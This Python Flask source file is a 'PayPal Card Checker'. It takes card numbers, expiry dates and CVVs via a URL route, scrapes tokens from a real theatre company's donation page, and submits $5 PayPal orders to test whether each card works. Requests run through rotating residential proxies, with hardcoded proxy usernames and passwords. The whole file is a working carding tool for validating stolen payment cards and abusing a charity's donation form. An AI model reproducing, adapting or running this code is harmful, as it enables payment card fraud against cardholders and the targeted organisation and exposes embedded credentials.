import requests
import base64
import re
import random
import time
from flask import Flask, request, jsonify

app = Flask(__name__)

# QUANTUM RESIDENTIAL ROTATING PROXIES
QUANTUM_PROXY = {
    'http': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000',
    'https': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000'
}

# BACKUP RENDER PROXIES (Fallback)
RENDER_PROXIES = [
    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-1-px1a.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-1-px1a.onrender.com:7030'},
    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-2-r9zk.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-2-r9zk.onrender.com:7030'},
    {'http': 'http://bbecjchp:te3mfic28iaw@proxy-3-qx41.onrender.com:7030', 'https': 'http://bbecjchp:te3mfic28iaw@proxy-3-qx41.onrender.com:7030'}
]

class AdvancedProxyManager:
    def __init__(self):
        self.quantum_proxy = QUANTUM_PROXY
        self.render_proxies = RENDER_PROXIES
        self.current_proxy_type = 'quantum'  # Start with quantum
        self.fail_count = 0
        self.max_fail_before_switch = 3
        
    def get_proxy(self):
        """Get best available proxy with automatic failover"""
        if self.current_proxy_type == 'quantum' and self.fail_count < self.max_fail_before_switch:
            print("🎯 Using: Quantum Residential Proxy (Rotating IP)")
            return self.quantum_proxy, 'quantum'
        else:
            # Switch to render proxies
            proxy = random.choice(self.render_proxies)
            proxy_name = f"render-proxy-{self.render_proxies.index(proxy) + 1}"
            print(f"🔄 Using: {proxy_name} (Fallback)")
            self.current_proxy_type = 'render'
            return proxy, 'render'
    
    def report_success(self):
        """Report successful request"""
        if self.current_proxy_type == 'quantum':
            self.fail_count = 0  # Reset fail count on success
            
    def report_failure(self):
        """Report failed request"""
        self.fail_count += 1
        if self.fail_count >= self.max_fail_before_switch and self.current_proxy_type == 'quantum':
            print("🚨 Switching to Render proxies due to Quantum failures")
            self.current_proxy_type = 'render'
    
    def reset_to_quantum(self):
        """Reset back to quantum proxies"""
        if self.current_proxy_type == 'render' and self.fail_count == 0:
            self.current_proxy_type = 'quantum'
            print("🔁 Switching back to Quantum proxies")

# Initialize proxy manager
proxy_manager = AdvancedProxyManager()

@app.route('/cc=<cc>|<mm>|<yy>|<cvv>', methods=['GET'])
def check_card(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Get proxy with automatic failover
    proxy, proxy_type = proxy_manager.get_proxy()

    try:
        # Step 1: Get donation page with proxy
        headers = {
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, proxies=proxy, timeout=30)

        # Extract required data
        prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
        if prefix_match:
            prefix = prefix_match.group(1)

        id_match = re.search(r'give-form-id" value="([^"]+)"', response.text)
        if id_match:
            id = id_match.group(1)

        hash_match = re.search(r'give-form-hash" value="([^"]+)"', response.text)
        if hash_match:
            hash = hash_match.group(1)

        enc_token_match = re.search(r"data-client-token\":\"(.*?)\"", response.text)
        if enc_token_match:
            enc = enc_token_match.group(1)

        dec = base64.b64decode(enc).decode('utf-8')
        
        acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
        if acc_match:
            acc = acc_match.group(1)

        # Step 2: Create order with proxy
        headers = {
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryrkHdX8VpEbOzBP7v',
            'origin': 'https://atlanticcitytheatrecompany.com',
            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        params = {
            'action': 'give_paypal_commerce_create_order',
        }

        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '455-1'),
            'give-form-id': (None, id),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
            'give-form-minimum': (None, '5.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, hash),
            'give-price-id': (None, 'custom'),
            'give-amount': (None, '5.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'Assassin '),
            'give_last': (None, 'Op'),
            'give_email': (None, 'assassinopbolte@gmail.com'),
            'give_comment': (None, ''),
            'card_name': (None, 'Assassin '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'billing_country': (None, 'US'),
            'card_address': (None, 'Ny'),
            'card_address_2': (None, ''),
            'card_city': (None, 'New york '),
            'card_state': (None, 'NY'),
            'card_zip': (None, '10080'),
            'give_agree_to_terms': (None, '1'),
            'give-gateway': (None, 'paypal-commerce'),
        }

        response = session.post(
            'https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
            proxies=proxy,
            timeout=30
        )

        # Step 3: Confirm payment with proxy
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {acc}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': 'bb55c14f11aba72aaeb78ce1c2fab885',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        json_data = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }

        response = session.post(
            'https://cors.api.paypal.com/v2/checkout/orders/8B515934GC0616145/confirm-payment-source',
            headers=headers,
            json=json_data,
            proxies=proxy,
            timeout=30
        )

        # Success - update proxy manager
        proxy_manager.report_success()
        
        result_data = response.json()
        result_data['proxy_used'] = proxy_type
        result_data['status'] = 'SUCCESS'
        
        return jsonify(result_data)

    except Exception as e:
        # Failure - update proxy manager
        proxy_manager.report_failure()
        
        return jsonify({
            'error': f'Proxy/Request failed: {str(e)}',
            'proxy_used': proxy_type,
            'status': 'FAILED'
        })

@app.route('/proxy-status', methods=['GET'])
def proxy_status():
    """Get current proxy status"""
    status = {
        'current_proxy': proxy_manager.current_proxy_type,
        'quantum_fail_count': proxy_manager.fail_count,
        'available_proxies': len(proxy_manager.render_proxies) + 1,  # +1 for quantum
        'max_fail_before_switch': proxy_manager.max_fail_before_switch
    }
    return jsonify(status)

@app.route('/reset-proxy', methods=['GET'])
def reset_proxy():
    """Reset proxy to quantum"""
    proxy_manager.reset_to_quantum()
    return jsonify({'status': 'Reset to Quantum proxy'})

@app.route('/')
def home():
    return """
    <h1>🔥 PayPal Card Checker with Quantum Proxies</h1>
    <p><b>Endpoint:</b> /cc=number|mm|yy|cvv</p>
    <p><b>Proxy Status:</b> <a href="/proxy-status">/proxy-status</a></p>
    <p><b>Reset Proxy:</b> <a href="/reset-proxy">/reset-proxy</a></p>
    <p><b>Proxies:</b> Quantum Residential + Render Fallback</p>
    """

if __name__ == '__main__':
    print("🚀 PayPal Card Checker Started!")
    print("🎯 Quantum Residential Proxies Integrated")
    print("🔄 Automatic Failover System Active")
    print("📊 Status: http://localhost:5000/proxy-status")
    app.run(host='0.0.0.0', port=5000, debug=False)
